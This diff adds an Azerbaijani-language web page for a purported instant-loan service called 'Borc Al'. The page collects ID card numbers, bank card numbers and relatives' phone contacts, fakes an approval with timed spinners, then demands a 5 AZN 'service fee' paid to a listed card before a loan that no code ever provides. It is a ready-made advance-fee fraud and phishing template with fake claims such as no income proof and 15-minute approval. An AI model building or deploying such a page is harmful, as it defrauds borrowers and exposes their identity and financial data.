@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Borc Al - Onlayn Kredit Platforması</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #061126;
+            color: #ffffff;
+            padding-bottom: 80px; /* Alt naviqasiya üçün boşluq */
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background: #061126;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        /* Top Header & Logo */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 0 20px 0;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+        }
+
+        .brand-logo-icon {
+            background: linear-gradient(135deg, #0072ff, #00e5ff);
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 20px;
+            box-shadow: 0 4px 15px rgba(0, 229, 255, 0.3);
+        }
+
+        /* Top Horizontal Nav Pills (Screen 1) */
+        .top-pills {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding-bottom: 15px;
+            scrollbar-width: none;
+        }
+
+        .top-pills::-webkit-scrollbar { display: none; }
+
+        .pill-btn {
+            background: #0f214a;
+            border: 1px solid #1e3a75;
+            color: #ffffff;
+            padding: 10px 16px;
+            border-radius: 12px;
+            font-size: 13px;
+            white-space: nowrap;
+            font-weight: 600;
+        }
+
+        /* Stats Banner (Screen 1) */
+        .stats-banner {
+            background: linear-gradient(90deg, #0052d4, #4364f7, #6fb1fc);
+            border-radius: 16px;
+            padding: 14px;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-val {
+            font-size: 15px;
+            font-weight: bold;
+        }
+
+        .stat-lbl {
+            font-size: 11px;
+            opacity: 0.8;
+            margin-top: 2px;
+        }
+
+        /* Main Form Card (Flow logic) */
+        .card {
+            background: #0f214a;
+            border: 1px solid #1e3a75;
+            border-radius: 20px;
+            padding: 24px 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+        }
+
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.4s ease-in-out; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-title {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+
+        label {
+            font-size: 12px;
+            color: #8da4d0;
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px;
+            background: #061126;
+            border: 1px solid #1e3a75;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 14px;
+            margin-bottom: 16px;
+            outline: none;
+        }
+
+        input:focus, select:focus {
+            border-color: #00e5ff;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #0072ff 0%, #00e5ff 100%);
+            border: none;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 114, 255, 0.4);
+        }
+
+        .loader-box {
+            text-align: center;
+            display: none;
+            padding: 15px 0;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(0, 229, 255, 0.2);
+            border-top: 3px solid #00e5ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Features Section (Screen 1) */
+        .section-header {
+            margin-bottom: 15px;
+        }
+
+        .section-tag {
+            color: #00e5ff;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-top: 4px;
+        }
+
+        .feature-card {
+            background: #0b1a3a;
+            border: 1px solid #183163;
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .feature-icon {
+            width: 42px;
+            height: 42px;
+            background: #0f2a5c;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #00e5ff;
+            flex-shrink: 0;
+        }
+
+        .feature-info h4 {
+            font-size: 15px;
+            margin-bottom: 3px;
+        }
+
+        .feature-info p {
+            font-size: 12px;
+            color: #7b93c0;
+        }
+
+        /* Dashboard Limit Card Preview (Screen 2) */
+        .dash-card {
+            background: linear-gradient(135deg, #0e2a6d, #051438);
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid #1e3e80;
+        }
+
+        .dash-card .amount {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            margin: 10px 0 15px 0;
+        }
+
+        /* FAQ Section (Screen 4) */
+        .faq-item {
+            background: #0b1a3a;
+            border: 1px solid #183163;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+
+        .faq-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .faq-content {
+            display: none;
+            font-size: 13px;
+            color: #8da4d0;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+
+        /* Footer links (Screen 3) */
+        .footer {
+            margin-top: 40px;
+            border-top: 1px solid #162c5b;
+            padding-top: 25px;
+        }
+
+        .footer-group {
+            margin-bottom: 20px;
+        }
+
+        .footer-group h5 {
+            font-size: 14px;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+
+        .footer-group a {
+            display: block;
+            color: #7b93c0;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        .app-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .app-btn {
+            flex: 1;
+            background: #0b1a3a;
+            border: 1px solid #183163;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 11px;
+            color: #556c9e;
+            margin-top: 25px;
+        }
+
+        /* Bottom Navbar (Screen 1) */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            background: #061126;
+            border-top: 1px solid #183163;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            z-index: 100;
+        }
+
+        .nav-item {
+            text-align: center;
+            color: #556c9e;
+            font-size: 11px;
+            text-decoration: none;
+        }
+
+        .nav-item.active {
+            color: #00e5ff;
+        }
+
+        .nav-icon {
+            font-size: 18px;
+            margin-bottom: 3px;
+        }
+
+        .pay-box {
+            background: #061126;
+            border: 1px dashed #00e5ff;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .card-no {
+            font-size: 18px;
+            color: #00e5ff;
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            margin: 8px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- Header Logo -->
+    <div class="header">
+        <div class="brand-logo">
+            <div class="brand-logo-icon">B</div>
+            BORC AL
+        </div>
+    </div>
+
+    <!-- Top Navigation Pills -->
+    <div class="top-pills">
+        <div class="pill-btn">Kredit müraciəti</div>
+        <div class="pill-btn">Müraciətlərim</div>
+        <div class="pill-btn">Ödənişlər</div>
+        <div class="pill-btn">Dəstək</div>
+    </div>
+
+    <!-- Quick Stats Banner -->
+    <div class="stats-banner">
+        <div class="stat-item">
+            <div class="stat-val">15 dəq</div>
+            <div class="stat-lbl">Təsdiq</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-val">10%</div>
+            <div class="stat-lbl">İllik faiz</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-val">36 ay</div>
+            <div class="stat-lbl">Müddət</div>
+        </div>
+    </div>
+
+    <!-- Multi-Step Application Form Card -->
+    <div class="card">
+        
+        <!-- STEP 1: Identification -->
+        <div id="step1" class="step active">
+            <div class="form-title">Sürətli Kredit Müraciəti</div>
+            
+            <label>Şəxsiyyət vəsiqəsinin seriyası və nömrəsi</label>
+            <div class="input-group">
+                <select id="idSeries" style="width: 38%; margin-bottom: 0;">
+                    <option value="AA">AA</option>
+                    <option value="AB">AB</option>
+                    <option value="AZE">AZE</option>
+                </select>
+                <input type="text" id="idNumber" placeholder="Seriya nömrəsi" style="width: 62%; margin-bottom: 0;">
+            </div>
+
+            <button id="btn1" class="btn-primary" onclick="startStep1Process()">Krediti Yoxla →</button>
+            
+            <div id="loader1" class="loader-box">
+                <div class="spinner"></div>
+                <p style="font-size: 13px; color: #00e5ff;">Sistem yoxlayır, zəhmət olmasa gözləyin...</p>
+                <p style="font-size: 11px; color: #7b93c0; margin-top: 4px;">(Bu proses təxminən 1 dəqiqə çəkə bilər)</p>
+            </div>
+        </div>
+
+        <!-- STEP 2: Extended Details -->
+        <div id="step2" class="step">
+            <div style="text-align: center; color: #00e5ff; font-weight: bold; font-size: 14px; margin-bottom: 5px;">TƏSDİQLƏNMİŞ LİMİT</div>
+            <div style="text-align: center; font-size: 28px; font-weight: 800; margin-bottom: 20px;">3,000 ₼</div>
+
+            <label>Kreditin köçürüləcəyi Kart Nömrəsi</label>
+            <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+
+            <label>1. Yaxın Qohum (Ad, Soyad və Nömrə)</label>
+            <input type="text" placeholder="Əliyev Həsən - 050XXXXXXX">
+
+            <label>2. Yaxın Qohum (Ad, Soyad və Nömrə)</label>
+            <input type="text" placeholder="Məmmədova Aygün - 055XXXXXXX">
+
+            <label>İşlədiyiniz yer (Şirkət / Təşkilat adı)</label>
+            <input type="text" placeholder="İş yerinizin adı">
+
+            <label>Yaşadığınız Şəhər</label>
+            <input type="text" placeholder="Məsələn: Naxçıvan">
+
+            <button id="btn2" class="btn-primary" onclick="startStep2Process()">Müraciəti Tamamla →</button>
+
+            <div id="loader2" class="loader-box">
+                <div class="spinner"></div>
+                <p style="font-size: 13px; color: #00e5ff;">Məlumatlar emal olunur...</p>
+            </div>
+        </div>
+
+        <!-- STEP 3: Payment Requirement -->
+        <div id="step3" class="step">
+            <div class="form-title">Müraciətin Təsdiqlənməsi</div>
+
+            <div class="pay-box">
+                <p style="font-size: 13px; color: #ffffff;">Müraciətinizin dərhal aktiv olunması üçün <strong>5 AZN</strong> xidmət haqqı ödənilməlidir.</p>
+                <p style="font-size: 12px; color: #8da4d0; margin-top: 8px;">Aşağıdakı karta ödəniş edib çeki yükləyin:</p>
+                <div class="card-no">4169 7388 1234 5678</div>
+                <p style="font-size: 11px; color: #7b93c0;">Alıcı: BORC AL MMC</p>
+            </div>
+
+            <label>Ödəniş Çekini Yükləyin (Şəkil və ya PDF)</label>
+            <input type="file" accept="image/*,.pdf">
+
+            <button class="btn-primary" onclick="finishProcess()">Ödənişi Təsdiqlə və Pulu Al</button>
+        </div>
+
+        <!-- STEP 4: Success Message -->
+        <div id="step4" class="step" style="text-align: center;">
+            <div style="font-size: 48px; color: #00e5ff; margin-bottom: 10px;">✓</div>
+            <h3 style="font-size: 20px; color: #ffffff; margin-bottom: 10px;">Uğurla Tamamlandı!</h3>
+            <p style="font-size: 13px; color: #8da4d0; line-height: 1.5; margin-bottom: 20px;">
+                Ödənişiniz və müraciətiniz qəbul edildi. Təsdiqlənmiş kredit məbləği <strong>5 dəqiqə ərzində</strong> qeyd etdiyiniz kart hesabına köçürüləcəkdir.
+            </p>
+            <button class="btn-primary" onclick="location.reload()">Ana Səhifəyə Qayıt</button>
+        </div>
+
+    </div>
+
+    <!-- Benefits Section (Screen 1) -->
+    <div class="section-header">
+        <div class="section-tag">Üstünlüklərimiz</div>
+        <div class="section-title">Niyə BORC AL?</div>
+    </div>
+
+    <div class="feature-card">
+        <div class="feature-icon">💳</div>
+        <div class="feature-info">
+            <h4>Rəsmi gəlir tələbi yox</h4>
+            <p>Arayış və iş yeri sənədi lazım deyil</p>
+        </div>
+    </div>
+
+    <div class="feature-card">
+        <div class="feature-icon">✓</div>
+        <div class="feature-info">
+            <h4>Keçmiş gecikmə maneə deyil</h4>
+            <p>Hər müraciət ayrıca dəyərləndirilir</p>
+        </div>
+    </div>
+
+    <div class="feature-card">
+        <div class="feature-icon">⏱</div>
+        <div class="feature-info">
+            <h4>15 dəqiqədə təsdiq</h4>
+            <p>Sürətli avtomatik yoxlama sistemi</p>
+        </div>
+    </div>
+
+    <div class="feature-card">
+        <div class="feature-icon">📱</div>
+        <div class="feature-info">
+            <h4>Dərhal kart hesabınızda</h4>
+            <p>Saniyələr ərzində köçürmə</p>
+        </div>
+    </div>
+
+    <!-- FAQ Section (Screen 4) -->
+    <div class="section-header" style="margin-top: 30px;">
+        <div class="section-tag">Sual-Cavab</div>
+        <div class="section-title">Ən çox verilən suallar</div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-title">
+            Kredit almaq üçün hansı sənədlər lazımdır? <span>▼</span>
+        </div>
+        <div class="faq-content">
+            Yalnız şəxsiyyət vəsiqənizin seriya və nömrəsi kifayətdir. Heç bir əlavə arayış tələb olunmur.
+        </div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-title">
+            Kredit nə qədər müddətə təsdiqlənir? <span>▼</span>
+        </div>
+        <div class="faq-content">
+            Müraciətiniz avtomatlaşdırılmış sistem tərəfindən maksimum 15 dəqiqə ərzində cavablandırılır.
+        </div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-title">
+            Pul nə zaman kart hesabıma gələcək? <span>▼</span>
+        </div>
+        <div class="faq-content">
+            Təsdiqləmə və ödəniş çeki qəbul edildikdən sonra 5 dəqiqə ərzində məbləğ kartınıza köçürülür.
+        </div>
+    </div>
+
+    <!-- Footer Section (Screen 3) -->
+    <div class="footer">
+        <div class="footer-group">
+            <h5>Şirkət</h5>
+            <a href="#">Xidmətlər</a>
+            <a href="#">Necə işləyir</a>
+            <a href="#">FAQ</a>
+        </div>
+
+        <div class="footer-group">
+            <h5>Hüquqi</h5>
+            <a href="#">İstifadə şərtləri</a>
+            <a href="#">Məxfilik siyasəti</a>
+            <a href="#">Kredit şərtləri</a>
+            <a href="#">Lisenziya</a>
+        </div>
+
+        <div class="footer-group">
+            <h5>Əlaqə</h5>
+            <a href="#">info@borcal.az</a>
+            <a href="#">Bakı, Azərbaycan</a>
+        </div>
+
+        <div class="app-buttons">
+            <div class="app-btn">Google Play</div>
+            <div class="app-btn">App Store</div>
+        </div>
+
+        <div class="copyright">
+            © 2026 BORC AL MMC. Bütün hüquqlar qorunur.
+        </div>
+    </div>
+
+    <!-- Bottom Navigation Bar (Screen 1) -->
+    <div class="bottom-nav">
+        <a href="#" class="nav-item active">
+            <div class="nav-icon">🏠</div>
+            Ana səhifə
+        </a>
+        <a href="#" class="nav-item">
+            <div class="nav-icon">📄</div>
+            Müraciətlər
+        </a>
+        <a href="#" class="nav-item">
+            <div class="nav-icon">💳</div>
+            Ödənişlər
+        </a>
+        <a href="#" class="nav-item">
+            <div class="nav-icon">👤</div>
+            Profil
+        </a>
+    </div>
+
+</div>
+
+<script>
+    // 1-ci addım: 1 dəqiqə (60000ms) gözləmə məntiqi
+    function startStep1Process() {
+        document.getElementById('btn1').style.display = 'none';
+        document.getElementById('loader1').style.display = 'block';
+
+        setTimeout(function() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }, 60000); 
+    }
+
+    // 2-ci addım: 3.5 saniyə (3500ms) gözləmə məntiqi
+    function startStep2Process() {
+        document.getElementById('btn2').style.display = 'none';
+        document.getElementById('loader2').style.display = 'block';
+
+        setTimeout(function() {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+        }, 3500); 
+    }
+
+    // 3-cü addım: Yekun təsdiq
+    function finishProcess() {
+        document.getElementById('step3').classList.remove('active');
+        document.getElementById('step4').classList.add('active');
+    }
+
+    // Sual-Cavab (FAQ) açılıb-bağlanma funksiyası
+    function toggleFaq(element) {
+        const content = element.querySelector('.faq-content');
+        if (content.style.display === "block") {
+            content.style.display = "none";
+        } else {
+            content.style.display = "block";
+        }
+    }
+</script>
+
+</body>
+</html>
